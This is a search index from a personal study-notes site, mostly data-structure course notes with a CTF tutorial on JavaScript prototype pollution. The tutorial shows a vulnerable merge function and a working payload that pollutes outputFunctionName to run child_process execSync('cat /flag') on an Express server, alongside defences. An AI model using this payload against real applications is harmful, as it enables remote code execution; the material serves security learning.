{"config":{"lang":["en"],"separator":"[\\s\\u200b\\-_,:!=\\[\\]()\"`/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#welcome-to-auroraolians-notebook","title":"Welcome to AuroraOlian's Notebook! \ud83d\udcda","text":""},{"location":"#whats-in-this-notebook","title":"What's in this notebook?","text":"<p>This notebook is a collection of notes, articles, tutorials, and other resources on a wide range of topics. Some of the topics I'm interested in include: computer science, programming, distributed system, artificial intelligence, and more. I'm always learning new things, so the content of this notebook will evolve over time. I hope you find something here that interests you! \ud83d\ude0a</p>"},{"location":"#some-statement","title":"Some Statement","text":"<p>Some notes are directly <code>Ctrl C/V</code> from Obsidian or Notion, so there might be some formatting issues. I'll try to fix them as soon as possible. \ud83e\udd70</p>"},{"location":"fds/","title":"FDS","text":"<p>the key to understand every data structure 1. \u4e86\u89e3\u6bcf\u79cd\u6570\u636e\u7ed3\u6784\u7684\u5b9a\u4e49\u65b9\u5f0f 2. \u5404\u79cd\u64cd\u4f5c\uff0cex. \u589e\u5220\u6539\u67e5\uff0c\u6807\u6ce8\u51fa\u4e00\u4e9b\u5bb9\u6613\u5fd8\u8bb0\u7684(give pseudocode) 3. \u590d\u6742\u5ea6\u5206\u6790\uff01\uff08\u6709\u65f6\u5019\u8fd9\u4e2a\u5206\u6790\u4f1a\u53d8\u5f97\u5f88\u590d\u6742\uff09 4. collect wrong problem</p> <p>[!tldr] Link other's error set</p>"},{"location":"fds/#stack","title":"Stack \u6808","text":"<ul> <li>[1] push &amp; pop</li> </ul> <p>\u82e5\u4e00\u4e2a\u6808\u7684\u5165\u6808\u5e8f\u5217\u4e3a 1\u30012\u30013\u3001\u2026\u3001N\uff0c\u8f93\u51fa\u5e8f\u5217\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f i\uff0c\u5219\u7b2c j \u4e2a\u8f93\u51fa\u5143\u7d20\u662f</p> <pre><code>max{1, i-j+1} ~ i+j-1?\n</code></pre> <ul> <li>[2] \u540e\u7f00\u8868\u8fbe\u5f0f   <code>a*(b+c)-d</code> -&gt; <code>a b c + * d -</code></li> </ul>"},{"location":"fds/#tree","title":"Tree \u6811","text":"<p>[!quote]+ Conception</p> <ul> <li>degree</li> <li>degree of a node: number of subtree</li> <li>degree of a tree: max{degree(node)}</li> <li>parent/children</li> <li>siblings/leaf</li> <li>path</li> <li>length of path ::= number of edges on the path</li> <li>depth of \\(n_i\\) ::= length of the unique path from the root to \\(n_i\\)</li> <li> <p>height</p> </li> <li> <p>height of \\(n_i\\) ::= length of the longest path from \\(n_i\\) to a leaf</p> </li> <li> <p>height of a tree ::=height(root) = depth(deepest leaf)</p> </li> <li> <p>ancestors of a node ::= all the nodes along the path from the node up to the root</p> </li> <li>descendants of a node ::= all the nodes in its subtrees</li> </ul> <p>[!important] Type of Tree</p> <ul> <li>[[#^ThreadedBinaryTree | Threaded Binary Tree]]</li> <li>Binary Search Tree(BST)</li> <li>Skewed Binary Trees</li> <li>Complete Binary tree: All the leaf nodes are on two adjacent levels</li> </ul> <p>[!note] Properties of Binary Trees</p> <ul> <li>The maximum number of nodes on level\u00a0 i\u00a0 is \\(2^{i-1}\\)</li> <li>The maximum number of nodes in a binary tree of depth k is \\(2^k - 1\\)</li> <li>For any nonempty binary tree, \\(n_0 = n_2 + 1\\) where \\(n_0\\) is the number of leaf nodes and \\(n_2\\) is the number of nodes of degree 2.</li> <li>(Generalized conclusion) For any tree, \\(n_0 = 1 + 0 \\cdot n_1 + 1 \\cdot n_2 + 2 \\cdot n_3 + \\cdots\\) where \\(n_0\\) is the number of leaf nodes, \\(n_i\\) is the number of nodes of degree i(i &gt; 0)</li> </ul> <p>[!note]- Threaded Binary Tree(\u7ebf\u7d22\u4e8c\u53c9\u6811) \u4e00\u7bc7\u4e0d\u9519\u7684\u6587\u7ae0 The links of a binary tree with n nodes are 2n, among which n+1 links are null. We can replace the null links by \"threads\" which will make traversals easier.</p> <ul> <li>If Tree-&gt;Left is null, replace it with a pointer to the inorder predecessor of Tree</li> <li>If Tree-&gt;Right is null, replace it with a pointer to the inorder successor of Tree.</li> </ul> <pre><code>typedef\u00a0 struct\u00a0 ThreadedTreeNode\u00a0 *PtrTo\u00a0 ThreadedNode;\ntypedef\u00a0 struct\u00a0 PtrToThreadedNode\u00a0 ThreadedTree;\ntypedef\u00a0 struct\u00a0 ThreadedTreeNode {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 int\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0 LeftThread;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ThreadedTree\u00a0 \u00a0 Left;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ElementType\u00a0 Element;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 int\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0 RightThread;\n\u00a0\u00a0\u00a0\u00a0\u00a0  ThreadedTree\u00a0 \u00a0 Right;\n}\n</code></pre> <p>^ThreadedBinaryTree</p> <p>[!note] Complete Binary Tree We can represent a complete binary tree with n nodes sequentially, then for any node with index \\(i\\), we have: <code>Array Representation :\u00a0 BT [ n + 1 ]\u00a0 ( BT [ 0 ] is not used)</code> index of parent(i) = \\(\\lfloor \\frac{i}{2} \\rfloor(i \\neq 1)\\) index of left child(i) = \\(2i(2i \\le n)\\) index of right child(i) =\\(2i+1(2i+1 \\le n)\\)</p> <p>[!summary]+ Operation</p> <ul> <li>FirstChild-NextSibling Representation</li> <li>tree -&gt; binary tree: \u5148\u5144\u5f1f\u76f8\u8fde\u7559\u957f\u5b50\uff0c\u8f6c 45\u00b0\uff0c</li> <li>forest -&gt; binary tree\uff1a\u5728\u6bcf\u4e2a\u6811\u5f62\u6210\u5404\u81ea\u7684\u4e8c\u53c9\u6811\u7684\u57fa\u7840\u4e0a\u5c06\u6839\u8282\u70b9\u8fde\u8d77\u6765</li> <li>Pre-order/In-order/Post-order/Level-order Traversals (Recursively | Iteratively)</li> <li>BST:</li> <li>Find/FindMin/FindMax</li> <li>Insert</li> <li>Delete<ul> <li>Delete a leaf node:\u00a0 Reset its parent link to NULL.</li> <li>Delete a degree 1 node:\u00a0 Replace the node by its single child.</li> <li>Delete a degree 2 node: 1. Replace the node by the largest one in its left subtree or the smallest one in its right subtree. 2. Delete the replacing node from the subtree. <p>[!note]- If there are not many deletions, then lazy deletion may be employed: add a flag field to each node, to mark if a node is active or is deleted.\u00a0 Therefore we can delete a node without actually freeing the space of that node.\u00a0 If a deleted key is reinserted, we won\u2019t have to call malloc again.</p> </li> </ul> </li> <li>Tree -&gt; Threaded Binary Tree</li> <li>write the pre-order/in-order/post-order traversals</li> <li>replace the null node with its predecessor/successor(\u524d\u9a71/\u540e\u9a71)</li> </ul> <ol> <li>full binary tree \u7684\u8282\u70b9\u6570\u91cf\u4e3a\\(2^n\\)</li> <li>If a general tree\u00a0T\u00a0is converted into a binary tree\u00a0BT, then which of the following\u00a0BT\u00a0traversals gives the same sequence as that of the post-order traversal of\u00a0T? <code>In-order traversal</code></li> </ol>"},{"location":"fds/#priority-queue","title":"Priority Queue \u4f18\u5148\u961f\u5217","text":"<p>A min/max heap is a complete binary tree that is also a min tree.</p> <p>[!summary]+ Operation</p> <ul> <li>Percolate up/down</li> <li>Insert</li> <li>Delete min/max</li> <li>min heap &lt;-&gt; max heap</li> </ul> <pre><code>// a random array -&gt; heap\nfor (int i = N / 2; i &gt;= 0; --i)\n PercolateDown(i);\n</code></pre>"},{"location":"fds/#the-disjoint-set-adt","title":"The Disjoint Set ADT \u4e0d\u76f8\u4ea4\u96c6","text":"<p>[!quote]+ Conception</p> <ul> <li>Equivalence Relations   A relation R is defined on a set \\(S\\) if for every pair of elements (a, b), \\(a, b \\in S\\), \\(a \\ R \\ b\\) is either true or false.\u00a0 If \\(a \\ R \\ b\\) is true, then we say that a is related to b.   Properties:</li> <li>(Reflexive \u81ea\u53cd\u6027) \\(a \\ R \\ a\\), for all \\(a \\in S\\).</li> <li>(Symmetric \u5bf9\u79f0\u6027) \\(a \\ R \\ b\\) if and only if \\(b \\ R \\ a\\).</li> <li>(Transitive \u4f20\u9012\u6027) \\(a \\ R \\ b\\) and \\(b \\ R \\ c\\) that \\(a \\ R \\ c\\)</li> <li>disjoint</li> </ul> <p>[!summary]+ Operation</p> <ul> <li>Union and Find -&gt; Union-find</li> <li>Union-by-Size</li> <li>Union-by-Height</li> <li>Path Compression</li> </ul>"},{"location":"fds/#graph","title":"Graph \u56fe","text":"<p>[!quote] Definitions \\(G(V, E)\\) Undirected graph Directed graph Complete graph: a graph that has the maximum number of edges</p> <p>Simple path ::= \\(v_{i1}, v_{i2}, \\cdots, v_{in}\\) are distinct Cycle connected: - vi and vj in an undirected G are connected if there is a path from vi to vj (and hence there is also a path from vj to vi) - An undirected graph G is connected if every pair of distinct vi and vj are connected</p>"},{"location":"fds/#wrong-problem-collection","title":"Wrong Problem Collection \u9519\u9898\u96c6","text":"<ol> <li>If an undirected graph G = (V, E) contains 10 vertices. Then to guarantee that G is connected in any cases, there has to be at least __ edges.    \u5982\u679c\u524d V-1 \u4e2a\u8282\u70b9\u662f\u5168\u8fde\u63a5\u7684\uff0c\u90a3\u4e48\u4efb\u610f\u52a0\u5165 1 edge \u624d\u53ef\u4ee5 guarantee that G is connected.    37 <code>YES</code> | 9 <code>NO</code></li> <li>In a binary search tree which contains several integer keys including 4, 5, and 6, if 4 and 6 are on the same level, then 5 must be their parent.    <code>NO</code> counterexample: 4 &lt;- 3 &lt;- 5 -&gt; 7 -&gt; 6</li> <li>In a complete binary tree with 1102 nodes, there must be __ leaf nodes.\u00a0(6 \u5206)    \u5012\u6570\u7b2c\u4e8c\u6392\u7684\u5927\u90e8\u5206\u8282\u70b9\u4e5f\u662f\u53f6\u5b50\u8282\u70b9</li> <li>79</li> <li>551</li> <li>1063</li> <li>cannot be determined</li> <li> <p>The recurrent equations for the time complexities of programs P1 and P2 are:</p> </li> <li> <p>P1:\u00a0T(1)=1,\u00a0T(N)=T(N/2)+1;</p> </li> <li>P2:\u00a0T(1)=1,\u00a0T(N)=2T(N/2)+1;</li> </ol> <p>Then the correct conclusion about their time complexities is:</p> <ol> <li>O(logN)\u00a0for P1, and\u00a0O(N)\u00a0for P2    https://zhu45.org/posts/2017/Mar/26/maw-chapter-6-priority-queues-heaps-writing-questions/</li> </ol> <p>If a\u00a0d-heap is stored as an array, for an entry located in position\u00a0i, the parent, the first child and the last child are at: A. \u2308(i+d\u22122)/d\u2309,\u00a0(i\u22122)d+2, and\u00a0(i\u22121)d+1 B. \u2308(i+d\u22121)/d\u2309,\u00a0(i\u22122)d+1, and\u00a0(i\u22121)d C. \u230a(i+d\u22122)/d\u230b,\u00a0(i\u22121)d+2, and\u00a0id+1 D. \u230a(i+d\u22121)/d\u230b,\u00a0(i\u22121)d+1, and\u00a0id</p> <ol> <li>For a graph, if each vertex has an even degree or only two vertexes have odd degree, we can find a cycle that visits every edge exactly once    \u8981\u6c42\u56fe\u662f\u8054\u901a\u7684</li> </ol> <p>![[Pasted image 20240509233731.png]]</p> <p>[!tip]</p> <ol> <li>If time complexity with adjacency list is \\(O(|E| + |V|)\\), then it's \\(O(|V|^2)\\) for adjacency matrix(Just think the graph is dense, then we have \\(|E| \\approx |V|^2\\))</li> <li>For recursive sorting algorithm, we can use recursive relations to analyse time complexity</li> </ol>"},{"location":"fds/#representation-of-graph","title":"Representation of graph","text":"<ul> <li>adjacency matrix: space complexity\\(O(|V^2|)\\) suitable for dense graph</li> <li>adjacency list: \\(O(|E| + |V|)\\) suitable for sparse graph</li> </ul> <p>Question: The vertex is name(string) rather than number Solutions:</p> <ul> <li>use hash table</li> <li>string array(not recommend)</li> <li>use pointer to hash table (lose purity)</li> </ul>"},{"location":"fds/#topological-sort-dag","title":"Topological sort (DAG) \u62d3\u6251\u6392\u5e8f","text":"<p>time complexity: \\(O(|V|^2)\\) bad point: sequential scan for Indegree array optimize: use stack or queue to store vertices whose indegree is 0 and adjacency list -&gt; \\(O(|E| + |V|)\\) \u9006\u5e8f\u62d3\u6251\u6392\u5e8f \u2753</p>"},{"location":"fds/#the-shortest-path-algorithm","title":"The shortest path algorithm \u6700\u77ed\u8def\u5f84\u7b97\u6cd5","text":"<ul> <li>unweighted: BFS(breadth-first search, like lever-order traversal to tree): use queue and adjacency list -&gt; \\(O(|E| + |V|)\\)</li> <li>weighted positive edge: Dijkstra algorithm</li> <li><code>findMin</code>(simply scan the table) \\(O(|V|^2)\\) + <code>update</code> \\(O(|E|)\\) = \\(O(\\)|V|^2)       PS: \u53ef\u4ee5\u901a\u8fc7\u8bb0\u5f55\u6bcf\u4e2a\u8282\u70b9\u7684\u4e0a\u4e2a\u8282\u70b9\u6765\u8bb0\u5f55\u8def\u5f84\uff0c\u7528\u9012\u5f52\u6765\u663e\u793a</li> <li>keep distance in a priority queue(can optimize with pairing heap):<ul> <li><code>deleteMin</code> \\(O(|E|\\ log|V|)\\) + <code>decrease</code> \\(O(|V|\\ log{V})\\) = \\(O(|E|\\ log|V|)\\)</li> <li>decrease -&gt; insert xxx \ud83d\udc40</li> </ul> </li> <li>use Fibonacci heap: \\(O(|E| + |V|\\ log|V|)\\) \ud83d\udc40</li> <li>weighted edge(maybe negative): combine weighted and unweighted algorithm: If a vertex is updated, then put it into queue (if it's not in queue), then dequeue, update and continue: \\(O(|E||V|)\\)   If there is negative-cost cycle(\u8d1f\u503c\u5708) in the graph, stop the algorithm if any vertex has been dequeued for \\(|V| + 1\\) times to ensure the program will end. \u2753</li> </ul> <p>If the graph is acyclic, we can use topological sort to improve Dijkstra algorithm \\(O(|E| + |V|)\\) Application: critical path analysis(activity-node graph -&gt; event-node graph: analysis based on edge rather than vertex) find the longest path and obtain earliest/latest completion time of every node, then obtain the slack time(\u677e\u5f1b\u65f6\u95f4), which represent how long one activity can be delayed without delaying the overall completion all-pairs shortest path problem: use single-source algorithm for \\(V\\) times</p>"},{"location":"fds/#minimum-spanning-tree","title":"Minimum spanning tree","text":""},{"location":"fds/#prim","title":"Prim","text":""},{"location":"fds/#kruskal","title":"Kruskal","text":""},{"location":"fds/#strong-connected-componentscc","title":"Strong Connected Component(SCC) \u5f3a\u8fde\u901a\u5206\u91cf","text":""},{"location":"fds/#kosaraju-algorithm","title":"Kosaraju Algorithm","text":""},{"location":"fds/#sort","title":"Sort","text":"<p>![[Pasted image 20240521015228.png]]</p> <p>stability: a sorting algorithm is said to be stable if two objects with equal keys appear in the same order in sorted output as they appear in the input data set.</p> <ul> <li>stable sort algorithm: Bubble Sort, Insertion Sort, Merge Sort, Count Sort(?)</li> <li>un stable sort algorithm: Heap Sort, Quick Sort, Shell Sort</li> </ul> <p>Q: which sort algorithm need extra space? A: Merge Sort</p> <p>During the sorting, processing every element which is not yet at its final position is called a \"run\"</p> <p>Q: Which sort algorithm will be slowed down if we store the elements in a linked structure instead of a sequential structure? A: Heap Sort, Shell Sort, Quick Sort Merge Sort?</p>"},{"location":"fds/#insertion-sort","title":"Insertion Sort \u63d2\u5165\u6392\u5e8f","text":"<pre><code>// Insertion Sort \u63d2\u5165\u6392\u5e8f\nvoid InsertionSort(ElementType A[], int N) \n{\n    // \u8fd9\u6837\u4ea4\u6362\u8d4b\u503c\u7684\u6b21\u6570\u4f1a\u51cf\u534a\n    int j, P;\n    ElementType Tmp;\n    for (P = 1; P &lt; N; P++) {\n        Tmp = A[p];\n        for (j = P; j &gt; 0 &amp;&amp; A[j-1] &gt; Tmp; j--)\n            A[j] = A[j-1];\n        A[j] = Tmp;\n    }\n}\n</code></pre> <p>Time Complexity: worst \\(O(N^2)\\) best \\(O(N)\\) If the sequence is almost sorted, then insertion sort will run fast</p>"},{"location":"fds/#shell-sort","title":"Shell Sort \u5e0c\u5c14\u6392\u5e8f","text":"<p>shell sort is also called diminishing increment sort(\u7f29\u5c0f\u589e\u91cf\u6392\u5e8f) increment sequence(\u589e\u91cf\u5e8f\u5217)</p> <p>Question: give two sequence and ask the increment of shell sort Method: \u4ee3\u5165\u4e0d\u540c\u7684 increment \u770b\u8fd9\u4e2a increment \u7684 sequence \u662f\u4e0d\u662f sorted\uff0c\u518d\u6bd4\u8f83\u4e24\u5e8f\u5217\u4e2d\u5143\u7d20\u662f\u5426\u76f8\u540c</p>"},{"location":"fds/#heap-sort","title":"Heap Sort","text":"<pre><code>void HeapSort(ElementType A[], int N)\n{\n for (int i = N / 2; i &gt;= 0; i--)\n  PercDown(A, i, N);\n for (int i = N - 1; i &gt; 0; i--) {\n  Swap(&amp;A[0], &amp;A[i]);\n  PercDown(A, 0, i);\n }\n\n}\n</code></pre>"},{"location":"fds/#merge-sort","title":"Merge Sort","text":"<p>divide-and-conquer strategy</p> <pre><code>void MergeSort(ElementType A[], ElementType TmpArray[], int Left, int Right)\n{\n if (Left &lt; Right) {\n  int Center = (Left + Right) / 2;\n  MergeSort(A, TmpArray, Left, Center);\n  MergeSort(A, TmpArray, Center + 1, Right);\n  Merge(A, TmpArray, Left, Center + 1, Right)\n }\n}\n</code></pre> <p>space complexity: \\(O(NlogN)\\) - A \u548c TmpArray \u62f7\u8d1d -&gt; \u9012\u5f52\u4ea4\u66ff\u5c42\u6b21 - save space: A[] * max + Temp[] -&gt; Final[], it can also be understood as a number in multiple digits, AT, \u7b2c\u4e8c\u4f4d\u8868\u793a A[i], \u7b2c\u4e00\u4f4d\u8868\u793a Temp[i] time complexity: \\(O(NlogN)\\) (derived from recursive relation)</p> <p>Comment: It is widely used for external sorting, where random access can be very, very expensive compared to sequential access.</p> <p>\u96be\u7528\u4e8e\u8d2e\u5b58\u6392\u5e8f variant: implementation without recursion</p>"},{"location":"fds/#quick-sort","title":"Quick Sort \u5feb\u901f\u6392\u5e8f","text":"<p>The fastest known sorting algorithm in practice</p> <ol> <li>pick pivot(\u67a2\u7ebd\u5143)</li> <li>a wrong &amp; uninformed way: choose the first element (\ud83e\udd14bad: If the input is presorted, then quick sort will take \\(O(N)^2\\) time to do nothing)</li> <li>a safe maneuver: randomly choose pivot (\ud83e\udd14bad: random number generation is generally expensive)</li> <li>Median-of-Three Partitioning(\u4e09\u6570\u4e2d\u503c\u5206\u5272\u6cd5): pick three elements randomly and using the median of these three as pivot      The minimum and maximum number wind up in the correct place, which act as a sentinel</li> <li>partition (two schemes) 1. \u4ece\u5de6\u5230\u53f3\u626b\u5e76\u8bbe\u7f6e\u4e00\u4e2a\u5206\u754c\u7ebf 2. \u5de6\u53f3\u4e24\u8fb9\u4e00\u8d77\u626b\uff0c\u6709\u4e0d\u7b26\u5408\u7684\u5c31\u4e92\u6362    For very small arrays(\\(N \\le 20\\)), use insertion sort rather than quick sort    Time complexity: best \\(O(NlogN)\\)(analysis is same as merge sort) worst \\(O(N^2)\\)</li> </ol> <p>Comment: - Quicksort is probably more effective for datasets that fit in memory. For larger data sets it proves to be inefficient so algorithms like merge sort are preferred in that case.</p> <p>Application: find k-th maximum number \u53ef\u4ee5\u786e\u5b9a k \u5927\u6570\u5728 pivot \u7684\u5de6\u53f3\u6765\u7f29\u5c0f\u533a\u95f4</p>"},{"location":"fds/#bucket-sort","title":"Bucket Sort","text":""},{"location":"fds/#radix-sort","title":"Radix Sort","text":"<p>https://www.geeksforgeeks.org/msd-most-significant-digit-radix-sort/</p> <ul> <li>Least Signification Digit (LSD) radix sort</li> <li>Most Signification Digit (MSD) radix sort</li> </ul>"},{"location":"fds/#counting-sort","title":"Counting Sort","text":""},{"location":"fds/#questions","title":"Questions","text":"<p>[!question] Common question \u5224\u65ad\u67d0\u4e2a\u5e8f\u5217\u662f\u67d0\u4e2a\u6392\u5e8f\u7b2c k \u6b21\u6267\u884c\u5b8c\u7684\u7ed3\u679c</p> <ul> <li>quick sort: \u770b sequence \u4e2d\u6709\u51e0\u4e2a pivot\uff0c\u6b63\u5e38\u6765\u8bf4\u5e94\u8be5\u6709\\(2^k - 1\\)\uff08\u51c6\u786e\u6765\u8bf4\u5e94\u8be5\u662f\u5927\u4e8e\u7b49\u4e8e\uff09\uff0c\u4f46\u662f\u5982\u679c\u67d0\u4e2a pivot \u662f\u6700\u524d/\u540e\u9762\u7684\u5219\u4f1a\u5c11 1 \u4e2a</li> <li>LSD/MSD radix sort: \u76f4\u63a5\u53bb\u770b\u9009\u9879\u4e2d\u5e8f\u5217\u7684\u540e/\u524d k \u4f4d\u662f\u4e0d\u662f\u4ece\u5c0f\u5230\u5927\uff08\u6216\u8005\u81ea\u5df1\u5148\u5199\u51fa\u6765\u4e5f\u884c\uff09</li> </ul> <p>During the sorting, processing every element which is not yet at its final position is called a \"run\". Which of the following cannot be the result after the second run of quicksort?</p> <p>A. 5, 2, 16, 12, 28, 60, 32, 72 B. 2, 16, 5, 28, 12, 60, 32, 72 C. 2, 12, 16, 5, 28, 32, 72, 60 D. 5, 2, 12, 28, 16, 32, 72, 60</p> <p>During the sorting, processing every element which is not yet at its final position is called a \"run\". To sort a list of integers using quick sort, it may reduce the total number of recursions by processing the small partion first in each run.</p> <p>F. The number of recursions is independent of which sequence is processed first</p> <p>![[Pasted image 20240521020705.png]]</p>"},{"location":"fds/#hash","title":"Hash","text":""},{"location":"fds/#bonus","title":"Bonus","text":""},{"location":"fds/#lrulease-recent-used","title":"LRU(Lease Recent Used)","text":"<p>\u652f\u6301 get \u548c put \u64cd\u4f5c \u5f85\u505a\u7684 LFU</p>"},{"location":"blog/","title":"Blog","text":""},{"location":"ctf/prototype_pollution/","title":"JavaScript Prototype Pollution","text":""},{"location":"ctf/prototype_pollution/#introduction","title":"Introduction","text":"<p>Prototype pollution is a vulnerability injecting values that overwrite or pollute the \u201cprototype\u201d of a base object to compromise the application, which could lead to DoS, RCE, XSS, etc.</p>"},{"location":"ctf/prototype_pollution/#prototype-chain","title":"Prototype chain","text":"<p>\ud83d\udcab JS features: everything is an object(except primitives)</p> <ul> <li>Every JavaScript object has the proto  attribute, and every object inherits Prototypes, whenever a Prototype is added, it is inherited by all objects in the prototype chain.</li> <li>When we create a function in JavaScript, JavaScript engine will create an object (the prototype object of the function)automatically.</li> <li>The function has a property called prototype, which points to the prototype object.</li> <li>The prototype object has a constructor property, which points back to the function.</li> <li><code>Foo.prototype.constructor === Foo</code> is true</li> </ul>"},{"location":"ctf/prototype_pollution/#__proto__-prototype","title":"<code>__proto__</code> &amp; prototype","text":"<ul> <li>Every object is constructed by a constructor function</li> <li>Every object has a <code>__proto__</code> property that points to the constructor function\u2019s prototype object.</li> <li><code>object.__proto__ === constructor.prototype</code> is true</li> </ul> <pre><code>function Foo() {\n  this.bar = 1;\n}\n\nFoo.prototype = {\n  method: function () {\n    console.log(this.bar);\n  },\n};\n\nlet foo = new Foo();\n\nconsole.log(foo.__proto__); // { method: [Function: method] }\nconsole.log(foo.__proto__.__proto__); // [Object: null prototype] {}\nconsole.log(foo.__proto__.__proto__.__proto__); // null\nconsole.log(Foo.prototype); // { method: [Function: method] }\nconsole.log(foo.__proto__ === Foo.prototype); // true\n\n/* output\n{ method: [Function: method] }\n[Object: null prototype] {}\nnull\n{ method: [Function: method] }\ntrue\n*/\n</code></pre> <p>prototype chain: <code>foo \u2192 Foo.prototype \u2192 Object.prototype \u2192 null</code></p> <p>Here\u2019s a more intuitive picture</p> <p></p> <p>The end of the prototype chain is null.</p>"},{"location":"ctf/prototype_pollution/#inherit","title":"Inherit","text":"<pre><code>function Father() {\n  this.first_name = \"Drederick\";\n  this.last_name = \"Irving\";\n}\n\nfunction Son() {\n  this.first_name = \"Kyrie\";\n}\n\nSon.prototype = new Father();\n\nlet son = new Son();\nconsole.log(`Name: ${son.first_name} ${son.last_name}`); // Name: Kyrie Irving\n\nconsole.log(son); // Father { first_name: 'Kyrie' }\nconsole.log(son.__proto__); // Father { first_name: 'Drederick', last_name: 'Irving' }\nconsole.log(son.__proto__.__proto__); // {}\nconsole.log(son.__proto__.__proto__.__proto__); // [Object: null prototype] {}\nconsole.log(son.__proto__.__proto__.__proto__.__proto__); // null\nconsole.log(Father.prototype); // {}\nconsole.log(son.__proto__.__proto__ === Father.prototype); // true\n\n/* output\nName: Kyrie Irving\nFather { first_name: 'Kyrie' }\nFather { first_name: 'Drederick', last_name: 'Irving' } \n{}\n[Object: null prototype] {}\nnull\n{}\ntrue\n*/\n</code></pre> <p>When finding the value of a property, JavaScript will look for it in the object itself, then in its prototype, then in the prototype of the prototype, and so on until it finds the property or reaches the end of the prototype chain, which is null.</p>"},{"location":"ctf/prototype_pollution/#other-relevant-methods-in-javascript","title":"Other relevant methods in JavaScript","text":"<ul> <li><code>hasOwnProperty()</code>: returns a boolean indicating whether the object has the specified property as its own property (as opposed to inheriting it).</li> <li><code>in</code>: returns a boolean indicating whether the object has the specified property.</li> </ul>"},{"location":"ctf/prototype_pollution/#prototype-pollution","title":"Prototype Pollution","text":"<p>If we revise the value of <code>foo.__proto__</code>, we can change the value of Foo.prototype or Object.prototype. Below is an easy example:</p> <pre><code>let foo = { bar: 1 };\nconsole.log(foo.bar); // 1\n\nfoo.__proto__.bar = 2;\nconsole.log(foo.bar); // 1\n\nlet zoo = {};\nconsole.log(zoo.bar); // 2\n\n/* output\n1\n1\n2\n*/\n</code></pre> <p>In what cases can we pollute the prototype?</p> <ul> <li>Object merge</li> <li>object clone (core: merge object to be cloned to the target object)</li> </ul> <p>below is an example of object merge:</p> <pre><code>function merge(target, source) {\n  for (let key in source) {\n    console.log(key);\n    if (key in source &amp;&amp; key in target) {\n      merge(target[key], source[key]);\n    } else {\n      target[key] = source[key];\n    }\n  }\n}\n\nlet o1 = {};\n\n// let o2 = { a: 1, __proto__: { b: 2 } };\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}');\n\nmerge(o1, o2);\n\nvar o3 = {};\n\nconsole.log(o1, \"|\", o1.__proto__, \"|\", o1.__proto__.__proto__);\nconsole.log(o2, \"|\", o2.__proto__, \"|\", o2.__proto__.__proto__);\nconsole.log(o3, \"|\", o3.__proto__, \"|\", o3.__proto__.__proto__);\n\nfunction Foo() {\n    this.bar = 1\n    this.show = function() {\n        console.log(this.bar)\n    }\n}\n\n(new Foo()).show()\n\n/* output: let o2 = { a: 1, __proto__: { b: 2 } };\na\nb\n{ a: 1, b: 2 } | [Object: null prototype] {} | null     \n{ a: 1 } | { b: 2 } | [Object: null prototype] {}       \n{} | [Object: null prototype] {} | null\n1\n*/\n\n/* output: let o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}');\na\n__proto__\nb\n{ a: 1 } | [Object: null prototype] { b: 2 } | null     \n{ a: 1, ['__proto__']: { b: 2 } } | { b: 2 } | [Object: null prototype] { b: 2 }\n{} | [Object: null prototype] { b: 2 } | null\n1\n*/\n</code></pre> <p>If we directly let o2 equal to <code>{ a: 1, __proto__: { b: 2 } }</code>, <code>o2[\"__proto__\"] = { b: 2 };</code> won't be parse as key value pair, but the prototype of o2. However, if we use <code>JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}');</code>, it will be parsed as key value pair.</p>"},{"location":"ctf/prototype_pollution/#examples","title":"Examples","text":""},{"location":"ctf/prototype_pollution/#gyctf2020ez_express","title":"[GYCTF2020]Ez_Express","text":"<p>the part of prototype pollution in the source code:</p> <pre><code>const merge = (a, b) =&gt; {\n  for (var attr in b) {\n    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a;\n};\nconst clone = (a) =&gt; {\n  return merge({}, a);\n};\n\nrouter.post(\"/action\", function (req, res) {\n  if (req.session.user.user != \"ADMIN\") {\n    res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\");\n  }\n  req.session.user.data = clone(req.body);\n  res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\");\n});\n\nrouter.get(\"/info\", function (req, res) {\n  res.render(\"index\", (data = { user: res.outputFunctionName }));\n});\n</code></pre> <p>Combine the above code with the vulnerability of <code>res.render</code>(don't introduce here), the payload is <code>let a = {__proto__: {outputFunctionName:\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//\"}};</code> when sending a POST request to <code>/action</code>.</p>"},{"location":"ctf/prototype_pollution/#defense-methods","title":"Defense methods","text":""},{"location":"ctf/prototype_pollution/#block-the-__proto__-key-when-performing-operations-on-objects","title":"block the <code>__proto__</code> key when performing operations on objects","text":"<p>But there is a bypass method like <code>foo[\"constructor\"][\"prototype\"][\"bar\"] = 2;</code>, so these methods need to be blocked together to ensure safety.</p>"},{"location":"ctf/prototype_pollution/#use-objectcreatenull-to-create-a-pure-object","title":"Use <code>Object.create(null)</code> to create a pure object","text":"<p>This can create an empty object without the <code>__proto__</code> property, a truly empty object with no methods. Because of this, there won't be any prototype pollution</p> <p>Avoid directly modifying the prototype of built-in objects, such as <code>Object.prototype</code> or <code>Array.prototype</code>. Modifying the prototype of built-in objects affects all objects created through these prototypes, leading to unpredictable consequences.</p>"},{"location":"ctf/prototype_pollution/#use-es6-class-syntax","title":"Use ES6 <code>class</code> syntax","text":"<p>Using <code>class</code> syntax to define objects helps reduce the chance of directly manipulating the prototype. <code>class</code> syntax is more modern and structured, which helps improve code readability and maintainability.</p>"},{"location":"ctf/prototype_pollution/#conclusion","title":"Conclusion","text":"<p>The concept of prototypes that everyone is familiar with in frontend development has become a common attack technique in the field of security.</p> <p>If it runs, it can be cracked!</p>"},{"location":"dm/","title":"Discrete Mathematics and Its 